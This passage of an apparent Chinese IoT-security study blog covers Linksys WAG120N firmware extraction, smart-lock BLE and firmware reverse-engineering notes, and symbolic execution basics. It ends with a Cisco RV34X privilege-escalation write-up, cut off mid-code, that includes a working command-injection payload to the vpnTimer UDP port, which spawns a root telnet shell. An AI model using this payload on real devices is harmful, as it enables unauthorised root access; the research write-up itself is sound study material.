<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 此时就不必-n限制长度了</span></span><br><span class="line"><span class="comment"># 可见是 SQUASHFS</span></span><br><span class="line">lxl@ubuntu:~/Desktop/tmp$ strings kernel | grep filesystem</span><br><span class="line">VFS: Mounted root (%s filesystem)%s.</span><br><span class="line">filesystems</span><br><span class="line">&lt;4&gt;SQUASHFS: Mounting a different endian SQUASHFS filesystem on %s</span><br><span class="line">&lt;3&gt;SQUASHFS error: Major/Minor mismatch, filesystem is (%d:%d), I support (%d: &lt;= %d)</span><br><span class="line">&lt;3&gt;%s %s: can<span class="string">'t create entry in proc filesystem!</span></span><br><span class="line"><span class="string">register_filesystem</span></span><br><span class="line"><span class="string">unregister_filesystem</span></span><br></pre></td></tr></table></figure>
<ul>
<li>查找SquashFs的signature</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># SquashFS是很常见的嵌入式文件系统，binwalk有许多其signatures（Magic包含于signatures</span></span><br><span class="line"><span class="comment"># sqsh是标志SquashFS image的Magic，但也有其他变体情况，故binwalk也可能覆盖不全，也需手动找</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 文件系统要从整个bin固件中找，kernel中只是相关信息</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 固件中有许多section（如binwalk所示），节通常会有对齐，因此节与节之间一般会有00的填充字符</span></span><br><span class="line"><span class="comment"># 比如，sercomm节（binwalk也识别出来了）</span></span><br><span class="line"><span class="comment"># less可滚轮，或空格下翻，ctrl+b上翻</span></span><br><span class="line">lxl@ubuntu:~/Desktop/tmp$ hexdump -C WAG120N-EU-ANNEXB-ETSI-1.00.16code.bin | less</span><br><span class="line">0000e500  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|</span><br><span class="line">*</span><br><span class="line">0000ff90  00 00 00 00 00 00 00 00  00 ac 73 45 72 43 6f 4d  |..........sErCoM|</span><br><span class="line">0000ffa0  6d 01 00 00 01 59 51 5a  00 00 00 00 00 00 00 00  |m....YQZ........|</span><br><span class="line">0000ffb0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|</span><br><span class="line">*</span><br><span class="line">0000ffd0  00 00 00 10 06 00 00 01  00 73 45 72 43 6f 4d 6d  |.........sErCoMm|</span><br><span class="line">0000ffe0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|</span><br><span class="line">0000fff0  31 2e 30 31 00 00 00 00  00 00 00 00 00 00 00 00  |1.01............|</span><br><span class="line"></span><br><span class="line"><span class="comment"># hexdump时，如果遇到相同字符（如00填充字符），通常会用*来代替</span></span><br><span class="line"><span class="comment"># 文件系统一般会独立作为一个节存在，其前面的节可能有00填充</span></span><br><span class="line"><span class="comment"># 因此，hexdump中找*，其后面可能就是文件系统</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 上面的sercomm是一个敏感的节，但考虑到其太小，故不可能是文件系统，下面也是</span></span><br><span class="line">0001fde0  ff ff ff ff ff ff ff ff  ff ff ff ff ff ff ff ff  |................|</span><br><span class="line">*</span><br><span class="line">0001fe40  ff ff ff ff ff ff ff ff  ff ff ff ff ff ff 66 66  |..............ff|</span><br><span class="line">0001fe50  99 99 77 66 77 66 55 44  cc aa 88 66 cc aa 88 66  |..wfwfUD...f...f|</span><br><span class="line">0001fe60  ff ff ff ff ff ff ff ff  ff ff ff ff ff ff ff ff  |................|</span><br><span class="line">*</span><br><span class="line">0001ff70  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|</span><br><span class="line"></span><br><span class="line"><span class="comment"># 遇到sqlz字符串（less中 /\* 查找*号，要转义，n查找下一个</span></span><br><span class="line"><span class="comment"># 标准的SquashFs以'sqsh'开头，故sqlz可疑</span></span><br><span class="line"><span class="comment"># 大多数使用SquashFS的固件倾向于使用LZMA压缩，而不是标准的zlib压缩，这个就是</span></span><br><span class="line"><span class="comment"># 因此sqlz可能：sq-SquashFS、lz-LZma</span></span><br><span class="line">000bce70  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|</span><br><span class="line">*</span><br><span class="line">000cfff0  00 2c 80 00 00 00 00 00  00 00 00 00 00 00 00 00  |.,..............|</span><br><span class="line">000d0000  73 71 6c 7a 00 00 02 ca  00 2c 7f 52 00 2c 7f 4a  |sqlz.....,.R.,.J|</span><br><span class="line">000d0010  00 00 00 00 00 2c 55 5f  00 2c 69 13 00 02 00 01  |.....,U_.,i.....|</span><br></pre></td></tr></table></figure>
<h2 id="04-提取filesystem"><a href="#04-提取filesystem" class="headerlink" title="04-提取filesystem"></a>04-提取filesystem</h2><ul>
<li>dd提取文件系统</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Linux进制转换</span></span><br><span class="line">lxl@ubuntu:~/Desktop/tmp$ <span class="built_in">printf</span> %d 0xd0000</span><br><span class="line">851968</span><br><span class="line"></span><br><span class="line"><span class="comment"># squashFs并非是固件的最后一个section，其最后如下</span></span><br><span class="line">00397f50  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|</span><br><span class="line">*</span><br><span class="line">003fffe0  fe 48 a7 be d5 84 f9 63  98 97 72 42 2b d4 5c 48  |.H.....c..rB+.\H|</span><br><span class="line">003ffff0  00 00 00 00 10 06 90 f7  65 52 63 4f 6d 4d 00 30  |........eRcOmM.0|</span><br><span class="line">00400000</span><br><span class="line"></span><br><span class="line"><span class="comment"># dd时，没指定count，还是一直到最后（难道解压suqashfs时也会忽略末尾垃圾数据？</span></span><br><span class="line">lxl@ubuntu:~/Desktop/tmp$ dd <span class="keyword">if</span>=WAG120N-EU-ANNEXB-ETSI-1.00.16code.bin of=squashfs bs=1 skip=851968</span><br></pre></td></tr></table></figure>
<ul>
<li>修改Magic，使file可识别</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 仍是data，未识别出来</span></span><br><span class="line">lxl@ubuntu:~/Desktop/tmp$ file squashfs </span><br><span class="line">squashfs: data</span><br><span class="line"></span><br><span class="line"><span class="comment"># vi修改sqlz为sqsh，再次file，已经识别出来了</span></span><br><span class="line">lxl@ubuntu:~/Desktop/tmp$ cp squashfs squashfs1</span><br><span class="line">lxl@ubuntu:~/Desktop/tmp$ vi squashfs1</span><br><span class="line">lxl@ubuntu:~/Desktop/tmp$ file squashfs squashfs1</span><br><span class="line">squashfs:  data</span><br><span class="line">squashfs1: Squashfs filesystem, big endian, version 2.1, 2916178 bytes, 714 inodes, blocksize: 65536 bytes, created: Fri Aug  6 08:11:16 2010</span><br></pre></td></tr></table></figure>
<ul>
<li>firmware-mod-kit中unsquashfs-lzma提取squashFs</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 由于lzma压缩以及v2.1老版本的原因，普通的squashFs提取工具并不能成功</span></span><br><span class="line"><span class="comment"># 借助于firmware-mod-kit，是一个工具集合，用到哪个就make哪个，比如这次src下的squashfs-2.1-r2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 进入目录，make获得可执行文件unsquashfs-lzma</span></span><br><span class="line">lxl@ubuntu:~/Desktop/tmp$ <span class="built_in">cd</span> firmware-mod-kit/src/squashfs-2.1-r2/</span><br><span class="line">lxl@ubuntu:~/Desktop/tmp/firmware-mod-kit/src/squashfs-2.1-r2$ ls</span><br><span class="line">Makefile  mksquashfs.c  mksquashfs.h  read_fs.c  read_fs.h  README  sort.c  squashfs_fs.h  unsquashfs.c</span><br><span class="line">lxl@ubuntu:~/Desktop/tmp/firmware-mod-kit/src/squashfs-2.1-r2$ make</span><br><span class="line">lxl@ubuntu:~/Desktop/tmp/firmware-mod-kit/src/squashfs-2.1-r2$ ls</span><br><span class="line">Makefile    mksquashfs.c  mksquashfs-lzma  read_fs.c  read_fs.o  sort.c  squashfs_fs.h  unsquashfs.c     unsquashfs.o</span><br><span class="line">mksquashfs  mksquashfs.h  mksquashfs.o     read_fs.h  README     sort.o  unsquashfs     unsquashfs-lzma</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提取squashFs（sqsh那个，而非sqlz那个</span></span><br><span class="line">lxl@ubuntu:~/Desktop/tmp$ ./firmware-mod-kit/src/squashfs-2.1-r2/unsquashfs-lzma squashfs</span><br><span class="line">Can<span class="string">'t find a SQUASHFS superblock on squashfs</span></span><br><span class="line"><span class="string">lxl@ubuntu:~/Desktop/tmp$ ./firmware-mod-kit/src/squashfs-2.1-r2/unsquashfs-lzma squashfs1</span></span><br><span class="line"><span class="string">Reading a different endian SQUASHFS filesystem on squashfs1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">created 532 files</span></span><br><span class="line"><span class="string">created 39 directories</span></span><br><span class="line"><span class="string">created 143 symlinks</span></span><br><span class="line"><span class="string">created 0 devices</span></span><br><span class="line"><span class="string">created 0 fifos</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 提取成功</span></span><br><span class="line"><span class="string">lxl@ubuntu:~/Desktop/tmp$ ls squashfs-root/</span></span><br><span class="line"><span class="string">bin  dev  etc  firmware  lib  linuxrc  proc  sbin  tmp  usr  var  www  www.ar  www.eng</span></span><br></pre></td></tr></table></figure>
<h2 id="05-其他"><a href="#05-其他" class="headerlink" title="05-其他"></a>05-其他</h2><ul>
<li>已遇到的dd用法汇总</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1</span></span><br><span class="line"><span class="comment"># 已知要提取多少数据（跳过8549574，1个1个提取，提取8549574次</span></span><br><span class="line">dd <span class="keyword">if</span>=US_AC15V1.0BR_V15.03.1.16_multi_TD01.bin bs=1 count=8549574 skip=ç of=image</span><br><span class="line">		<span class="comment"># if 参数设置输入的文件，</span></span><br><span class="line">		<span class="comment"># bs 是输入输出块的大小，</span></span><br><span class="line">		<span class="comment"># count 是输入输出块的个数(抽取的总字节数可以理解为 bs * count)，</span></span><br><span class="line">		<span class="comment"># skip 是从文件头开始的偏移量，</span></span><br><span class="line">		<span class="comment"># of 指定输出字节的保存位置，这些数据在 binwalk 中都能找到。</span></span><br><span class="line">		</span><br><span class="line"><span class="comment"># 2</span></span><br><span class="line"><span class="comment"># 不知道要提取多少（跳过1个1264484大小的块，不限制count，一直到最后</span></span><br><span class="line"><span class="comment"># 可见skip也是针对bs的</span></span><br><span class="line">dd bs=1264484 skip=1 <span class="keyword">if</span>=mw150rv5-cn-up.bin of=filesystem.bin</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3</span></span><br><span class="line"><span class="comment"># 不知道要提取多少（跳过11076，1个1个提取，不限制count，一直到最后</span></span><br><span class="line">dd <span class="keyword">if</span>=WAG120N-EU-ANNEXB-ETSI-1.00.16code.bin of=uboot.lzma bs=1 skip=11076</span><br></pre></td></tr></table></figure>
<ul>
<li>squash文件系统</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Although binwalk has several SquashFS signatures, it is not uncommon to find variations of the ‘sqsh’ magic string (<span class="built_in">which</span> indicates the beginning of a SquashFS image), so what we may be looking <span class="keyword">for</span> here is a non-standard SquashFS signature inside the firmware file.</span><br><span class="line"></span><br><span class="line"><span class="comment"># SquashFS是很常见的嵌入式文件系统，binwalk有许多其signatures（Magic包含于signatures</span></span><br><span class="line"><span class="comment"># sqsh是标志SquashFS image的Magic，但也有其他变体情况，故binwalk也可能覆盖不全，也需手动找</span></span><br></pre></td></tr></table></figure>
<ul>
<li>linux 文件大小的单位显示</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 默认是字节形式</span></span><br><span class="line"><span class="comment"># --block-size=k/m/g 指定</span></span><br><span class="line"><span class="comment"># ll --block-size=m</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>参考：<a href="http://www.devttys0.com/2011/05/reverse-engineering-firmware-linksys-wag120n/" target="_blank" rel="noopener">http://www.devttys0.com/2011/05/reverse-engineering-firmware-linksys-wag120n/</a></p>
</blockquote>
]]></content>
      <categories>
        <category>IOT安全</category>
      </categories>
      <tags>
        <tag>路由器</tag>
        <tag>固件分析</tag>
      </tags>
  </entry>
  <entry>
    <title>云丁鹿客智能门锁的安全分析</title>
    <url>/2021/05/21/iot/%E4%BA%91%E4%B8%81%E9%B9%BF%E5%AE%A2%E6%99%BA%E8%83%BD%E9%97%A8%E9%94%81%E7%9A%84%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<p>[TOC]</p>
<h1 id="云丁鹿客智能门锁的安全分析"><a href="#云丁鹿客智能门锁的安全分析" class="headerlink" title="云丁鹿客智能门锁的安全分析"></a>云丁鹿客智能门锁的安全分析</h1><h2 id="上"><a href="#上" class="headerlink" title="上"></a>上</h2><ul>
<li>概述：app与门锁的ble通信、app端（下篇是门锁固件端）</li>
<li>如何分析<ul>
<li>切入点：门锁可通过手机BLE开锁，故从app的开锁流程开始</li>
<li>方法：日志、流量、逆向</li>
</ul>
</li>
<li>Challenge/Response模式<ul>
<li>a：通知指令：app与门锁建立BLE连接后，当使用app开启门锁时，app会先下发一条通知指令，告知门锁准备进入开锁流程</li>
<li>b：Challenge：门锁向手机发送一组数字，称为Challenge；</li>
<li>c：Response：app对Challenge进行处理生成Response并发送给门锁，门锁验证Response正确时，就会开锁</li>
<li>何处认证：多次开锁，a仅一个字节（序列号）不同，故a握手作用，认证在b和c</li>
</ul>
</li>
<li>思路<ul>
<li>门锁返回challenge、aes-ebc加密、异或固定数据</li>
<li>ebc加密密钥BleKey：reset_token请求服务器、aes-cbc解密返回包中token-token即</li>
<li>cbc解密密钥CryptSecret：crypt_cecret请求服务器、返回包中secret即</li>
</ul>
</li>
<li>推测<ul>
<li>a：每次app与门锁建立通信时，都会请求一个Bletoken-BleKey并下发给门锁</li>
<li>b：当app与门锁建立通信时，如果没有Bletoken-BleKey，才会向服务器发送请求</li>
<li>证伪a：手机重复开启门锁，日志和流量中都没有http请求，故本地保存了，不需下载</li>
<li>证明b：清空app缓存，删除本地存储的BleKey，再开锁，出现http请求</li>
</ul>
</li>
<li>app通信<ul>
<li>app-服务器：aes-cbc解密 + reset_token返回包中token-token = ebc加密密钥</li>
<li>app-服务器：crypt_cecret返回包中secret = cbc解密密钥</li>
<li>app-服务器：base64解码 + reset_token返回包中buf-totalData = 门锁解密的BLeKey</li>
<li>app-门锁：sendBleKeyCommandNewProtocol，base64+totalData，下发BleKey，ble通信可被监听）</li>
<li>app-门锁：sendUnlockCommandNewProtocol，处理challenge后生成的response，开锁指令</li>
</ul>
</li>
<li>门锁校验<ul>
<li>app：发送通知，即将开锁</li>
<li>门锁：发送challenge</li>
<li>app：发送challenge加密后的response、加密密钥</li>
<li>门锁：密钥解密response，对比明文与原始的challenge</li>
</ul>
</li>
<li>开锁流程图<ul>
<li>本地没有BleKey：app请求CryptSecret（密钥）和BleToken（密文）、aes-cbc解密BleToken-token、明文即BleKey</li>
<li>本地有BleKey：aes-ebc加密challenge（BleKey为密钥）、密文异或固定数据=response、门锁对Response校验</li>
</ul>
</li>
</ul>
<h2 id="中"><a href="#中" class="headerlink" title="中"></a>中</h2><ul>
<li>概述：固件保存在MCU内置flash存储器中、通过MCU的调试接口提取固件</li>
<li>软件调试：<ul>
<li>依赖Linux系统提供的软件调试接口</li>
<li>gdbserver软件调试器（ida/gdb作为client）</li>
</ul>
</li>
<li>硬件调试：<ul>
<li>依赖MCU提供的硬件调试接口，SWD/JTAG</li>
<li>需要相对应的硬件调试器，如JLink（支持SWD/JATG）、STLink（支持SWD）</li>
</ul>
</li>
<li>MCU芯片手册，可找到<ul>
<li>mcu的核心：ARM Cortex-M3，ida加载固件时会设置</li>
<li>MCU提供的调试方式：何种调试接口，SWD/JTAG</li>
<li>调试接口的引脚定义：如何将mcu与硬件调试器相连</li>
<li>代码在内存中的位置：代码即狭义上固件、savebin提取固件会用到位置</li>
</ul>
</li>
<li>硬件调试器：<ul>
<li>连接PC与MCU，一端的USB口连PC，另一端连MCU</li>
<li>连接MCU的接口有多种，如SWD/JTAG</li>
<li>不同的调试接口，引脚定义也不同</li>
<li>通常会提供相应的软件工具，比如JLink Commander命令行工具</li>
</ul>
</li>
<li>读保护<ul>
<li>原则上，通过硬件调试器连接MCU提供的硬件调试接口，可读取MCU内置flash中的数据，即获取固件</li>
<li>芯片可开启读保护机制（Readout Protection）防止读取</li>
</ul>
</li>
<li>连线<ul>
<li>JLink的引脚定义，说的就是连mcu的哪一个，如Vtref即电源，就连接MCU的3.3V接口</li>
<li>若接口不好连，可提前焊接排针</li>
</ul>
</li>
<li>固件提取<ul>
<li>状态检测，显示基本信息（信息可能不对，假货）</li>
<li>connect：连接MCU接口</li>
<li>?指令，弹框，选择芯片的厂商及型号</li>
<li>s选择调试接口类型为SWD（默认JTAG）</li>
<li>选择通信速率，默认即可</li>
<li>显示内存信息，准备工作完成</li>
<li>savebin + 固件名 + 开始地址 + 结束地址    </li>
</ul>
</li>
<li>固件解析<ul>
<li>同属Cortex-M系列，所以分析方法就相同，核心是啥？//here</li>
<li>固件基址：代码在内存中的起始地址</li>
<li>寻找Reset中断的中断服务程序，跳转之后按“c”键（原理看其它文章//here）</li>
</ul>
</li>
<li>固件到底是啥？<ul>
<li>binwalk+固件：得到文件系统</li>
<li>vxworks固件：就是一个大文件</li>
<li>本文固件：是内存中的代码</li>
</ul>
</li>
<li>各种手册<ul>
<li>reference-manuals，参考手册，目录6 DBG-Debug Interface，确认是SWD调试、调试引脚（参考手册有多份，在EFM32GG这份）</li>
<li>data-sheets，数据表/产品规格，目录1. Feature List，确定核心为：ARM Cortex-M3</li>
<li>data-sheets，数据表/产品规格目录3.3 Memory Map，确定flash（即代码即固件）在内存中的位置为0-0x100000，固件基址即0</li>
</ul>
</li>
</ul>
<h2 id="下"><a href="#下" class="headerlink" title="下"></a>下</h2><ul>
<li>概要：swd动态调试、totaldata怎么到BleKey</li>
<li>IDA载入固件<ul>
<li>导航条：只有开始的一小部分被解析成代码了，其他绝大部分unexplored</li>
<li>字符串：“FreeRTOS”</li>
<li>推测：被解析的是bootloader，主程序可能使用了FreeRTOS系统</li>
</ul>
</li>
<li>两种思路<ul>
<li>直接“莽”：由bootloader开始分析，一直分析到BLE的处理流程</li>
<li>“投机取巧”法：电路板上有SWD引脚，故可以通过SWD调试，定位关键位置</li>
</ul>
</li>
<li>SEGGER JLink调试<ul>
<li>JLink：不仅可提取固件，也可动态调试</li>
<li>Ozone：SEGGER提供的图形界面工具，可展示多个subview</li>
<li>创建新项目：选择芯片型号、调试接口类型、通信速率等</li>
<li>也可选择openOCD配合JLink进行调试</li>
</ul>
</li>
<li>定位关键位置<ul>
<li>门锁与app的BLE通信，有AES加密保护，故从AES入手</li>
<li>芯片手册：提供AES处理模块，位于0x400E0000~0x400E0400</li>
<li>假设使用芯片的AES模块，而非自写的AES算法，那么必然访问这片内存</li>
<li>设置内存读写断点，手机上点击开锁，找到AES的处理函数，即AESFunc</li>
</ul>
</li>
<li>totalData<ul>
<li>二进制数据、经过base64</li>
<li>header：消息头、数据包序号、校验等</li>
<li>body：多个数据块，其结构：1类型-2长度-len内容</li>
</ul>
</li>
<li>AESEntry函数<ul>
<li>AESFunc的封装，totalData生成BleKey的核心代码</li>
<li>流程：totaldata、aes解密（需要根密钥）、异或、blekey</li>
</ul>
</li>
</ul>
<blockquote>
<p>参考：</p>
<ul>
<li><a href="https://www.4hou.com/posts/RkKY" target="_blank" rel="noopener">https://www.4hou.com/posts/RkKY</a></li>
<li><a href="https://www.4hou.com/posts/AW29" target="_blank" rel="noopener">https://www.4hou.com/posts/AW29</a></li>
<li><a href="https://www.4hou.com/posts/n79W" target="_blank" rel="noopener">https://www.4hou.com/posts/n79W</a></li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>IOT安全</category>
      </categories>
      <tags>
        <tag>智能门锁</tag>
      </tags>
  </entry>
  <entry>
    <title>符号执行的基础知识</title>
    <url>/2021/05/21/reverse/%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
    <content><![CDATA[<h1 id="符号执行的基础知识"><a href="#符号执行的基础知识" class="headerlink" title="符号执行的基础知识"></a>符号执行的基础知识</h1><ul>
<li><p>概要：符号执行、KLEE、LLVM、Inception</p>
</li>
<li><p>符号执行（symbolic execution）</p>
<ul>
<li>Wiki：通过分析程序，确定哪些输入向量，会对应导致程序的执行结果向量</li>
<li><p>通俗：给定英雄的最终属性值，分析出通过哪些出装，达到这种效果</p>
</li>
<li><p>白盒：分析程序输入，需要获取到目标源代码</p>
</li>
<li><p>静态：并没有实际执行程序，而是分析其执行路径</p>
</li>
<li><p>挖洞：英雄的最终属性值-程序bug状态，可用来挖掘漏洞的输入向量</p>
</li>
</ul>
</li>
<li><p>代码实例</p>
<ul>
<li>输入M,N,Q，输出x1,x2,x3和，什么样的输入向量&lt;M,N,Q&gt;，得到的三个输出变量和等于3？</li>
<li>树形结构列出所有情况，叶子节点即输出，当~M^(N&lt;5)^Q时，结果等于3</li>
<li>可逆向发现输入向量，如果把结果改为漏洞条件，可漏洞挖掘</li>
</ul>
</li>
<li><p>根据结果求输入</p>
<ul>
<li>约束规划的求解问题</li>
<li>数学工具，如SMT（Satisfiability Modulo Theory，可满足性模理论）和SAT</li>
</ul>
</li>
<li><p>过程截断问题</p>
<ul>
<li>实际的程序更复杂，包含与外设交互的系统函数</li>
<li>与外设交互的系统函数，其输入输出不会直接赋值到符号，故过程阻断</li>
<li>如示例中，文件读写操作，fputs写入文件后，fgets再读取文件，读取依赖前面的写入，因为写入了文件，故阻断</li>
</ul>
</li>
<li><p>解决过程截断</p>
<ul>
<li>经典项目KLEE（base LLVM）：重写与外设有关的系统函数，使符号数值的传递继续下去</li>
<li>思路简要：修改函数fputs写入变量、fgets读取变量（而非文件，变量的值可以传递）</li>
<li>KLEE中，重新对40个系统调用进行了建模，如open, read, write, stat, lseek, ftruncate, ioctl</li>
</ul>
</li>
<li><p>嵌入式设备的漏洞挖掘</p>
<ul>
<li>符号执行技术挖掘漏洞依然可行</li>
<li>过程截断问题：类似KLEE中与外设交互的系统调用建模</li>
<li>混合代码问题：嵌入式源代码中有c语言/二进制/汇编代码（写汇编的是为了提高程序执行效率）</li>
</ul>
</li>
<li><p>通过LLVM转换成LLVM-IR</p>
<ul>
<li>LLVM-IR：LLVM中间的语言表达形式，也是一种汇编语言</li>
<li>KLEE就是LLVM-IR工具实现的符号执行虚拟机</li>
</ul>
</li>
<li><p>LLVM-IR的变量有三种，通过前缀@或者%区分，@表示全局变量，%表示局部变量</p>
<ul>
<li>%或者@接数字，表示的是临时变量，在一个函数中，从0开始编号使用。比如%0，%1</li>
<li>%或者@接字符串，表示有名字的变量，可以任意使用；</li>
<li>第三类就是立即数</li>
</ul>
</li>
<li><p>LLVM-IR再次转化</p>
<ul>
<li>转换成LLVM-IR后，由于代码含有arm汇编，而其中没有调用参数的代码和方式，使得符号数值的传递再次中断，导致KLEE不能执行</li>
<li><p>需要对混合代码再次转化，使得arm汇编也能够被KLEE的符号执行虚拟机分析</p>
</li>
<li><p>USENIX Security18论文Inception，将混有高级/低级语言的代码同时转化成KLEE能够分析的语言</p>
</li>
</ul>
</li>
<li><p>小结</p>
<ul>
<li>现有的符号执行工具，主要基于KLEE，深入理解KLEE，有助于打造更加高效的工具</li>
<li>Inception工具针对ARM架构，而MIPS尚未有类似的符号执行工具</li>
<li>基于IDA的脚本工具bugscam，修改后能够支持MIPS，然而误报率非常高</li>
<li>如何符号执行 + IDA = 具有符号执行的MIPS漏洞分析工具 ？</li>
</ul>
</li>
</ul>
<blockquote>
<p>参考：<a href="https://www.anquanke.com/post/id/157928" target="_blank" rel="noopener">https://www.anquanke.com/post/id/157928</a></p>
</blockquote>
]]></content>
      <categories>
        <category>软件安全/逆向</category>
      </categories>
      <tags>
        <tag>符号执行</tag>
      </tags>
  </entry>
  <entry>
    <title>Cisco RV34X中的提权漏洞</title>
    <url>/2021/05/10/iot/Cisco%20RV34X%E4%B8%AD%E7%9A%84%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<p>[toc]</p>
<h1 id="Cisco-RV34X中的提权漏洞"><a href="#Cisco-RV34X中的提权漏洞" class="headerlink" title="Cisco RV34X中的提权漏洞"></a>Cisco RV34X中的提权漏洞</h1><ul>
<li>嵌入式设备中，一般都是root权限，因此需要提权的情况很少，但本例的nginx以www-data运行</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">/ $ netstat -ap|grep 9999</span><br><span class="line">netstat: showing only processes with your user ID</span><br><span class="line">udp        0      0 localhost:9999          0.0.0.0:*                           -</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/ $ ps|grep vpn</span><br><span class="line"> 9565 root      6216 S    &#123;vpnTimer&#125; /usr/bin/perl -w /usr/sbin/vpnTimer</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> <span class="variable">$socket</span> = new IO::Socket::INET (</span><br><span class="line">        LocalAddr =&gt; <span class="string">'127.0.0.1'</span>,</span><br><span class="line">        LocalPort =&gt; <span class="string">'9999'</span>,</span><br><span class="line">        Proto =&gt; <span class="string">'udp'</span>,</span><br><span class="line">) or die <span class="string">"ERROR in Socket Creation : $!\n"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/ $ python -c <span class="string">'from socket import *;socket(AF_INET, SOCK_DGRAM).sendto("+;/usr/sbin/telnetd -p 2324 -l /bin/sh&amp;",("127.0.0.1", 9999))'</span></span><br><span class="line">/ $ ps|grep tel</span><br><span class="line">25009 www-data  3228 S    telnetd -p 2323 -l /bin/sh</span><br><span class="line">28452 root      3116 S    /usr/sbin/telnetd -p 2324 -l /bin/sh</span><br><span class="line"></span><br><span class="line"> ✘ lxl@MBP  ~/Desktop/2  telnet 192.168.1.1 2323</span><br><span class="line">Trying 192.168.1.1...</span><br><span class="line">Connected to 192.168.1.1.</span><br><span class="line">Escape character is <span class="string">'^]'</span>.</span><br><span class="line">BusyBox v1.23.2 (2020-09-17 09:03:14 IST) built-in shell (ash)</span><br><span class="line">/ $ id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line">/ $</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> ✘ lxl@MBP  ~/Desktop/2  telnet 192.168.1.1 2324</span><br><span class="line">Trying 192.168.1.1...</span><br><span class="line">Connected to 192.168.1.1.</span><br><span class="line">Escape character is <span class="string">'^]'</span>.</span><br><span class="line">BusyBox v1.23.2 (2020-09-17 09:03:14 IST) built-in shell (ash)</span><br><span class="line">/ <span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/ <span class="comment"># netstat -ap|grep 9999</span></span><br><span class="line">udp        0      0 localhost:9999          0.0.0.0:*                           9565/perl</span><br><span class="line">/ <span class="comment">#</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 文中说321修了，322才修吧</span></span><br><span class="line"> lxl@192  ~/Documents/ww21/16-cisco-rv340-cve-2021609/firmware  md5 rootfs-32*/usr/sbin/vpnTimer</span><br><span class="line">MD5 (rootfs-320/usr/sbin/vpnTimer) = af286116744effb31f884023029bd853</span><br><span class="line">MD5 (rootfs-321/usr/sbin/vpnTimer) = af286116744effb31f884023029bd853</span><br><span class="line">MD5 (rootfs-322/usr/sbin/vpnTimer) = 5ff42a6175a31a16bec3a2330c549591</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">				<span class="keyword">if</span> (! recv(<span class="variable">$socket_new</span>, <span class="variable">$message</span>,1024,0)) &#123;</span><br><span class="line">					<span class="built_in">print</span> <span class="string">"Error reading from socket: $!\n"</span>;</span><br><span class="line">				&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">					<span class="comment"># We receive the connection name from our client.</span></span><br><span class="line">					<span class="keyword">if</span> (<span class="variable">$log</span> == 1) &#123;</span><br><span class="line">						system(<span class="string">"logger"</span>,<span class="string">"-t VPN-timer"</span>,<span class="string">"Message read: <span class="variable">$message</span>"</span>);</span><br><span class="line">					&#125;</span><br><span class="line">					my <span class="variable">$temp</span>=substr(<span class="variable">$message</span>,1,);</span><br><span class="line">					<span class="comment">#print "$temp\n"; #contains connection name</span></span><br><span class="line"></span><br><span class="line">					<span class="keyword">if</span> (index(substr(<span class="variable">$message</span>,0,1),<span class="string">"+"</span>) == 0)&#123;</span><br><span class="line">					        <span class="comment">#print "It is for ADD\n";</span></span><br><span class="line">						<span class="comment">#Now, check if it is for TVPNC or S2S.</span></span><br><span class="line">						my <span class="variable">$isTVPNC</span>=`uci get strongswan.<span class="variable">$temp</span>`;</span><br><span class="line">						</span><br><span class="line">						</span><br><span class="line">						</span><br><span class="line">						</span><br><span class="line">				<span class="variable">$socket_new</span>-&gt;recv(<span class="variable">$message</span>,1024,0);</span><br><span class="line">				<span class="keyword">if</span> (<span class="variable">$message</span> eq <span class="string">""</span>) &#123;</span><br><span class="line">					system(<span class="string">"logger"</span>,<span class="string">"-t VPN-timer"</span>,<span class="string">"Error reading from socket: $!"</span>);</span><br><span class="line">					<span class="built_in">print</span> <span class="string">"Error reading from socket: $!\n"</span>;</span><br><span class="line">				&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">					<span class="comment"># We receive the connection name from our client.</span></span><br><span class="line">					<span class="keyword">if</span> (<span class="variable">$message</span> =~ /<span class="variable">$regex</span>/) &#123;</span><br><span class="line">						<span class="keyword">if</span> (<span 